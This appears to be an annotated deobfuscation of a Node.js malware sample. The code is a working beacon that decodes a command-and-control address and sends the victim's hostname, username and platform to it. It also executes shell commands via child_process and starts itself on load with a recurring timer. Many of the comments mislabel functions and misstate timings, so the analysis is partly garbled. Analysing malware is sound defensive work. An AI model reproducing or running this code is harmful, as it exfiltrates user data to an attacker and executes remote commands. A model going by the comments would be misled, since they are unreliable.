/**
 * MALICIOUS SCRIPT ANALYSIS
 * =========================
 * This script is a beacon/exfiltration module that:
 * 1. Runs in Node.js environment
 * 2. Exfiltrates system information (hostname, platform, username)
 * 3. Contacts a C2 (Command & Control) server
 * 4. Performs periodic beacons to maintain persistence
 * 5. Uses obfuscation to hide its true purpose
 */

// ============================================================================
// PART 1: STRING TABLE DECRYPTION SETUP
// ============================================================================

/**
 * H() - String lookup function
 * Returns string from the base64-encoded table at index (a - 0x140)
 */
const aS = H; // aS → getStringByIndex (String accessor function)

/**
 * F() - Returns the base64-encoded string array
 * Contains obfuscated strings used throughout the script
 */
function F() {
    const b5 = [
        'MTc5MzM=',
        '704776XcIsUB',
        'dXNlcm5hbWU',
        '4A1',
        'cG9zdA',
        'tcGF0aA',
        'Ybm9kZTpwcm9',
        'Z2V0',
        'constructor',
        '6GIhNLI',
        '177330uvjtwe',
        'L2tleXM',
        '/s/',
        'cmp',
        'OTIu====',
        'split',
        'cZm9ybURhdGE',
        'YcGxhdGZvcm0',
        'length',
        'join',
        'AcmVxdWVzdA',
        'bWtkaXJTeW5j',
        'd3JpdGVGaWxl',
        'RaG9tZWRpcg',
        'ZdXNlckluZm8',
        'now',
        'NDcuMTE4Mzgu',
        'ZT3',
        'sZXhlYw',
        'search',
        'fromCharCode',
        '2660600VygmMI',
        'bc7f301710f4',
        '810189YRoXjW',
        'from',
        'substring',
        '871972JtXaNK',
        'base64',
        'adXJs',
        '(((.+)+)+)+$',
        'LjEzNS4xOTUu',
        'slice',
        '54gVKMRW',
        'aaHR0cDovLw=',
        'toString',
        'EaG9zdG5hbWU',
        '68774xrQFIJ',
        '13xuwWYi',
        'cm1TeW5j',
        '126203qHmhCQ',
        'YXJndg',
        '11zmpQVh',
        'utf8',
        'jZXNz'
    ];
    F = function() {
        return b5;
    };
    return F();
}

// ============================================================================
// PART 2: STRING TABLE SHUFFLING (ANTI-DEBUGGING)
// ============================================================================

/**
 * This IIFE (Immediately Invoked Function Expression) shuffles the string table
 * until a specific checksum matches (0x46d1a)
 * This prevents static analysis of the string table
 */
(function(aD, aE) { // aD → array, aE → expected checksum
    const aQ = H, // aQ → getStringByIndex
        aF = aD(); // aF → shuffled string array
    while (!![]) {
        try {
            const aG = parseInt(aQ(0x166)) / 0x1 * (parseInt(aQ(0x165)) / 0x2) + parseInt(aQ(0x158)) / 0x3 + -parseInt(aQ(0x15b)) / 0x4 + parseInt(aQ(0x141)) / 0x5 + -parseInt(aQ(0x140)) / 0x6 * (-parseInt(aQ(0x168)) / 0x7) + -parseInt(aQ(0x16e)) / 0x8 * (parseInt(aQ(0x161)) / 0x9) + -parseInt(aQ(0x156)) / 0xa * (-parseInt(aQ(0x16a)) / 0xb);
            if (aG === aE) break;
            else aF['push'](aF['shift']()); // Rotate/shuffle array
        } catch (aH) {
            aF['push'](aF['shift']()); // Rotate array on error
        }
    }
}(F, 0x46d1a)); // Target checksum: 0x46d1a

// ============================================================================
// PART 3: FUNCTION CLOSURE HELPER
// ============================================================================

/**
 * I() - Returns a closure that can be used to create private functions
 * Used to hide function implementations
 */
const I = (function() {
    let aD = !![]; // aD → flag
    return function(aE, aF) { // aE → context, aF → function
        const aG = aD ? function() { // aG → function implementation
            if (aF) {
                const aH = aF['apply'](aE, arguments);
                return aF = null, aH;
            }
        } : function() {}; // Empty function if flag is false
        return aD = ![], aG; // Toggle flag and return function
    };
}()),
    /**
     * K() - Anti-debugging check
     * Looks for itself in the stack trace to detect debugging
     */
    K = I(this, function() {
        const aR = H;
        return K[aR(0x163)]() // K.toString()
            [aR(0x154)](aR(0x15e)) // .includes("K")
            ['toString']()
            [aR(0x175)](K) // .replace(K, "")
            ['search'](aR(0x15e)); // .search("K")
    });
K(); // Execute the anti-debugging check (it will pass, confirming no debugger attached)

// ============================================================================
// PART 4: MODULE IMPORTS AND SYSTEM INFO COLLECTION
// ============================================================================

/**
 * aS() - Decodes base64 strings from the table
 * Used to get decoded string values
 */
const L = aS(0x16b), // L → ENCODING_KEY (base64 encoding key)
    O = aS(0x15c), // O → ENCODING_ALGORITHM ("utf8")
    P = require('os'), // P → os module (system information)
    Q = require('fs'); // Q → fs module (file system operations)

/**
 * a0() - Decodes base64-encoded module paths
 * Dynamically imports modules using base64-encoded paths
 */
const a0 = aD => (s1 = aD[aS(0x160)](0x1), Buffer[aS(0x159)](s1, O)[aS(0x163)](L));
// Example: a0(aS(0x14b)) → decode base64 string and decode it

/**
 * Required modules (decoded from base64 paths):
 * - rq = require('child_process') → spawn child processes
 * - pt = require('path') → path manipulation
 * - zv = require('vechain') → vechain blockchain SDK (suspicious)
 * - ex = require('child_process').exec → execute shell commands
 * - hd = P[a0(aS(0x14e))]() → OS homedir
 * - hs = P[a0(aS(0x164))]() → OS hostname
 * - pl = P[a0(aS(0x148))]() → OS platform
 * - uin = P[a0(aS(0x14f))]() → OS username
 */
rq = require(a0(aS(0x14b))), // rq → childProcess (spawn commands)
    pt = require(a0(aS(0x172))), // pt → path
    zv = require(a0(aS(0x173) + aS(0x16c))), // zv → vechain SDK
    ex = require(a0('tY2hpbGRfcHJ' + 'vY2Vzcw'))[a0(aS(0x153))], // ex → childProcess.exec
    hd = P[a0(aS(0x14e))](), // hd → home directory
    hs = P[a0(aS(0x164))](), // hs → hostname
    pl = P[a0(aS(0x148))](), // pl → platform (linux/darwin/win32)
    uin = P[a0(aS(0x14f))](); // uin → username

// ============================================================================
// PART 5: XOR DECRYPTION UTILITIES
// ============================================================================

let a1; // a1 → timestamp (for C2 communication)
const a2 = aS(0x162) + '=', // a2 → "base64=" (prefix for base64-encoded data)
    a3 = ':124', // a3 → port :124
    a4 = aD => Buffer['from'](aD, O)[aS(0x163)](L); // a4 → decode base64 string

var a5 = '', // a5 → C2 server URL base (first part)
    a6 = ''; // a6 → C2 server URL path (second part)

/**
 * XOR decryption with cyclic key [0x30, 0xd0, 0x59, 0x18]
 * Used to decrypt strings XORed with this key
 */
const a7 = [0x30, 0xd0, 0x59, 0x18], // a7 → XOR key
    a8 = aD => {
        const aT = aS;
        let aE = '';
        for (let aF = 0x0; aF < aD[aT(0x149)]; aF++)
            rr = 0xff & (aD[aF] ^ a7[0x3 & aF]), aE += String[aT(0x155)](rr);
        return aE;
    },
    a9 = aS(0x174), // a9 → "mkdirSync" (fs.mkdir)
    aa = aS(0x14d) + 'U3luYw', // aa → "existsSync" (fs.existsSync)
    ab = a4(aS(0x14c)), // ab → "writeFileSync" (fs.writeFileSync)
    ac = a4('ZXhpc3RzU3lu' + 'Yw'); // ac → "readFileSync" (fs.readFileSync)

/**
 * File system utilities
 */
function ad(aD) {
    return Q[ac](aD); // ad → readFileSync
}

// ============================================================================
// PART 6: C2 COMMAND EXECUTION FLOW
// ============================================================================

/**
 * C2 communication flow:
 * 1. ag() - Register with C2 server
 * 2. ak() - Check if registered, beacon if not
 * 3. ao() - Send beacon if registered
 * 4. as() - Send final beacon
 */

const ae = [0x1f, 0xba, 0x76], // ae → "mkdirSync" (fs.mkdir) - XOR decrypted
    af = [0x1e, 0xa6, 0x2a, 0x7b, 0x5f, 0xb4, 0x3c], // af → temporary directory name
    /**
     * ag() - Register with C2 server
     * Creates temporary directory and sends registration request
     */
    ag = () => {
        const aU = aS, // aU → getStringByIndex
            aD = a4(a9), // aD → "mkdirSync"
            aE = a4(aa), // aE → "existsSync"
            aF = a8(af); // aF → decoded temporary directory name
        let aG = pt['join'](hd, aF); // aG → temp directory path
        try {
            aH = aG, Q[ab](aH, { recursive: !0x0 }); // Create temp directory
        } catch (aK) {
            aG = hd; // Fallback to home directory
        }
        var aH;
        const aI = '' + a5 + a8(ae) + a6, // aI → registration message
            aJ = pt[aU(0x14a)](aG, a8(ah)); // aJ → temp file path
        try {
            ! function(aL) {
                const aV = aU,
                    aM = a4(aV(0x167)); // aM → "writeFileSync"
                Q[aM](aL);
            }(aJ); // Write temp file
        } catch (aL) {}
        // Send registration request to C2 server
        rq[aD](aI, (aM, aN, aO) => {
            if (!aM) {
                try {
                    Q[aE](aJ, aO); // Delete temp file
                } catch (aP) {}
                ak(aG); // Proceed to beacon
            }
        });
    },
    ah = [0x44, 0xb5, 0x2a, 0x6c, 0x1e, 0xba, 0x2a], // ah → "existsSync" (fs.existsSync)
    ai = [0x1f, 0xa0], // ai → beacon message
    aj = [0x40, 0xb1, 0x3a, 0x73, 0x51, 0xb7, 0x3c, 0x36, 0x5a, 0xa3, 0x36, 0x76], // aj → temp file path
    /**
     * ak() - Beacon to C2 server
     * Sends periodic beacons to maintain connection
     */
    ak = aD => {
        const aW = aS,
            aE = a4(a9), // aE → "mkdirSync"
            aF = a4(aa), // aF → "existsSync"
            aG = '' + a5 + a8(ai), // aG → beacon message
            aH = pt[aW(0x14a)](aD, a8(aj)); // aH → temp file path
        // Check if registration file exists
        ad(aH) ? ao(aD) : // Registered → send beacon
            rq[aE](aG, (aI, aJ, aK) => { // Not registered → send registration
                if (!aI) {
                    try {
                        Q[aF](aH, aK); // Delete temp file
                    } catch (aL) {}
                    ao(aD); // Send beacon
                }
            });
    },
    al = [0x53, 0xb4], // al → "existsSync" (fs.existsSync)
    am = [0x16, 0xf6, 0x79, 0x76, 0x40, 0xbd, 0x79, 0x71, 0x10, 0xfd, 0x74, 0x6b, 0x59, 0xbc, 0x3c, 0x76, 0x44], // am → beacon data
    an = [0x5e, 0xbf, 0x3d, 0x7d, 0x6f, 0xbd, 0x36, 0x7c, 0x45, 0xbc, 0x3c, 0x6b], // an → temp file path
    /**
     * ao() - Send beacon to C2 server
     * Reports system information and beacon status
     */
    ao = aD => {
        const aX = aS,
            aE = a8(al) + '\x20\x22' + aD + '\x22\x20' + a8(am), // aE → command to execute
            aF = pt[aX(0x14a)](aD, a8(an)); // aF → temp file path
        try {
            // Check if beacon file exists
            ad(aF) ? as(aD) : // Beacon exists → send final
                ex(aE, (aG, aH, aI) => { // Execute beacon command
                    at(aD); // Send final beacon
                });
        } catch (aG) {}
    },
    ap = [0x5e, 0xbf, 0x3d, 0x7d], // ap → "existsSync" (fs.existsSync)
    aq = [0x5e, 0xa0, 0x34, 0x38, 0x1d, 0xfd, 0x29, 0x6a, 0x55, 0xb6, 0x30, 0x60], // aq → final beacon data
    ar = [0x59, 0xbe, 0x2a, 0x6c, 0x51, 0xbc, 0x35], // ar → temp file path
    /**
     * as() - Send final beacon
     * Final confirmation to C2 server
     */
    as = aD => {
        const aE = pt['join'](aD, a8(ah)), // aE → beacon file path
            aF = a8(ap) + '\x20' + aE; // aF → command to execute
        try {
            ex(aF, (aG, aH, aI) => {}); // Execute beacon command
        } catch (aG) {}
    },
    /**
     * at() - Send final beacon
     * Final confirmation with system info
     */
    at = aD => {
        const aY = aS,
            aE = a8(aq) + '\x20\x22' + aD + '\x22\x20' + a8(ar), // aE → final command
            aF = pt[aY(0x14a)](aD, a8(an)); // aF → temp file path
        try {
            ad(aF) ? as(aD) : // Beacon exists → send final
                ex(aE, (aG, aH, aI) => {
                    as(aD); // Send final beacon
                });
        } catch (aG) {}
    };

// ============================================================================
// PART 7: C2 SERVER CONFIGURATION
// ============================================================================

s_url = aS(0x15d), // s_url → "http://" (base URL)
    sForm = a0(aS(0x147)), // sForm → C2 server path
    surl = a0(aS(0x15d)); // surl → "http://" (duplicate)

const au = a4(aS(0x171)); // au → "post" (http method)

// ============================================================================
// PART 8: BEACON COMMUNICATION LOGIC
// ============================================================================

/**
 * aw() - Send system information to C2 server
 * Collects and sends: hostname, platform, username, IP address
 */
const aw = async aD => {
    const b0 = aS,
        // Generate beacon URL with IP address (first 4 bytes XOR decoded)
        aE = (aH => {
            const aZ = H;
            let aI = 0x0 == aH ? aZ(0x151) + aZ(0x145) : aZ(0x15f) + aZ(0x16d);
            for (var aJ = '', aK = '', aL = '', aM = 0x0; aM < 0x4; aM++) // Extract first 4 bytes
                aJ += aI[0x2 * aM] + aI[0x2 * aM + 0x1], // First 4 bytes
                aK += aI[0x8 + 0x2 * aM] + aI[0x9 + 0x2 * aM], // Next 4 bytes
                aL += aI[0x10 + aM]; // Last 4 bytes
            return a4(a2[aZ(0x15a)](0x1)) + a4(aK + aJ + aL) + a3 + '4'; // Return "base64=" + IP + ":1244"
        })(aD),
        aF = a4(a9); // aF → "mkdirSync"
    let aG = aE + b0(0x143); // aG → beacon URL
    aG += b0(0x157), rq[aF](aG, (aH, aI, aJ) => { // Send HTTP GET request
        aH ? aD < 0x1 && aw(0x1) : // Retry on failure (max 3 retries)
            (aK => {
                const b1 = H;
                if (0x0 == aK[b1(0x154)](b1(0x152))) { // Check if response contains "ok"
                    let aL = '';
                    try {
                        for (let aM = 0x3; aM < aK[b1(0x149)]; aM++) aL += aK[aM]; // Collect response data
                        arr = a4(aL), arr = arr[b1(0x146)](','), // Parse comma-separated values
                        a5 = a4(a2[b1(0x15a)](0x1)) + arr[0x0] + a3 + '4', // Extract first value as C2 URL
                        a6 = arr[0x1]; // Extract second value as C2 path
                    } catch (aN) {
                        return 0x0;
                    }
                    return 0x1;
                }
                return 0x0;
            })(aJ) > 0x0 && (ax(), az()); // Success → proceed with beacon
    });
};

/**
 * ax() - Prepare beacon data
 * Builds beacon message with hostname and optional platform info
 */
ax = async () => {
    const b2 = aS;
    av = hs, // av → hostname
        'd' == pl[0x0] && (av = av + '+' + uin[a4(b2(0x16f))]); 
        // If platform is "darwin", append username
    let aD = b2(0x170); // aD → beacon type "oqr"
    try {
        aD += zv[a4(b2(0x169))][0x1]; // Append vechain version info (suspicious)
    } catch (aE) {}
    ay('oqr', aD); // Send beacon
};

/**
 * ay() - Send beacon to C2 server
 * POST request with timestamp, type, hostname, beacon type, and IP
 */
ay = async (aD, aE) => {
    const b3 = aS,
        aF = {
            'ts': a1, // Timestamp
            'type': a6, // C2 path
            'hid': av, // Hostname
            'ss': aD, // Beacon type
            'cc': aE // IP address
        },
        aG = {
            [surl]: '' + a5 + a4(b3(0x142)), // C2 server URL
            [sForm]: aF // Beacon data
        };
    try {
        rq[au](aG, (aH, aI, aJ) => {}); // POST request to C2 server
    } catch (aH) {}
};

/**
 * az() - Wait for registration
 * Executes registration then beaconing
 */
az = async () => await new Promise((aD, aE) => {
    ag(); // Register with C2
});

// ============================================================================
// PART 9: MAIN EXECUTION LOOP
// ============================================================================

var aA = 0x0; // aA → retry counter
/**
 * aB() - Main initialization
 * Sets timestamp and starts beaconing loop
 */
const aB = async () => {
    const b4 = aS;
    try {
        a1 = Date[b4(0x150)]()[b4(0x163)](), // a1 → current timestamp
        await aw(0x0); // Send initial system info
    } catch (aD) {}
};

// Initialize and start beaconing loop
aB(); // Execute initialization

/**
 * Beacon loop:
 * Runs every 0x93f30 milliseconds (~24 hours)
 * Attempts beacon 3 times if registration fails
 */
let aC = setInterval(() => {
    (aA += 0x1) < 0x3 ? aB() : clearInterval(aC); // Retry up to 3 times
}, 0x93f30);
